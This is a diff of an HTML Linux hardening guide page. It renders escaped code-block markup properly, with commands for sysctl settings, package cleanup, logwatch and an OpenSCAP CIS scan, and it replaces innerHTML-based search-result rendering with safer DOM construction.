+<span class="cmm"># Disable IPv6 if not needed</span>
 net.ipv6.conf.all.disable_ipv6 = 1
 EOF
-&lt;span class="fn"&gt;sysctl&lt;/span&gt; -p
+<span class="fn">sysctl</span> -p
 
-&lt;span class="cmm"&gt;# 9. Remove unnecessary packages&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; autoremove
-&lt;span class="fn"&gt;apt&lt;/span&gt; autoclean
+<span class="cmm"># 9. Remove unnecessary packages</span>
+<span class="fn">apt</span> autoremove
+<span class="fn">apt</span> autoclean
 
-&lt;span class="cmm"&gt;# 10. Set up log monitoring&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; install logwatch
-&lt;span class="cmm"&gt;# Configure /etc/logwatch/conf/logwatch.conf&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># 10. Set up log monitoring</span>
+<span class="fn">apt</span> install logwatch
+<span class="cmm"># Configure /etc/logwatch/conf/logwatch.conf</span></div>
         </div>
         <h3>Security Benchmarks</h3>
         <ul>
@@ -2649,9 +2649,9 @@ EOF
         </ul>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# OpenSCAP compliance scan (CIS benchmark)&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; install libopenscap8 scap-workbench
-&lt;span class="fn"&gt;oscap&lt;/span&gt; xccdf eval --profile xccdf_org.ssgproject.content_profile_cis   --results scan-results.xml   --report scan-report.html   /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml&lt;/div&gt;
+          <div class="code-block"><span class="cmm"># OpenSCAP compliance scan (CIS benchmark)</span>
+<span class="fn">apt</span> install libopenscap8 scap-workbench
+<span class="fn">oscap</span> xccdf eval --profile xccdf_org.ssgproject.content_profile_cis   --results scan-results.xml   --report scan-report.html   /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml</div>
         </div>
         <div class="tip-box">
           <strong>Tip:</strong> Use configuration management tools like <strong>Ansible</strong>, <strong>Chef</strong>, or <strong>Puppet</strong> to automate hardening across your infrastructure. Immutable infrastructure (containers, AMIs) also reduces the need for runtime hardening.
@@ -2830,15 +2830,32 @@ EOF
         item.title.toLowerCase().includes(query) ||
         item.desc.toLowerCase().includes(query)
       );
+      resultsDiv.replaceChildren();
       if (filtered.length === 0) {
-        resultsDiv.innerHTML = '<div class="search-result-item"><span class="result-title">No result found</span></div>';
+        const item=document.createElement('div');
+        item.className='search-result-item';
+        const title=document.createElement('span');
+        title.className='result-title';
+        title.textContent='No result found';
+        item.appendChild(title);
+        resultsDiv.appendChild(item);
       } else {
-        resultsDiv.innerHTML = filtered.map(item =>
-          `<div class="search-result-item" onclick="navigateTo('${item.id}')">
-            <span class="result-title">${item.title}</span>
-            <span class="result-desc">${item.desc}</span>
-          </div>`
-        ).join('');
+        filtered.forEach(itemData=>{
+          const item=document.createElement('div');
+          item.className='search-result-item';
+          item.addEventListener('click',()=>navigateTo(itemData.id));
+
+          const title=document.createElement('span');
+          title.className='result-title';
+          title.textContent=itemData.title;
+
+          const desc=document.createElement('span');
+          desc.className='result-desc';
+          desc.textContent=itemData.desc;
+
+          item.append(title,desc);
+          resultsDiv.appendChild(item);
+        });
       }
       resultsDiv.classList.add('active');
     }
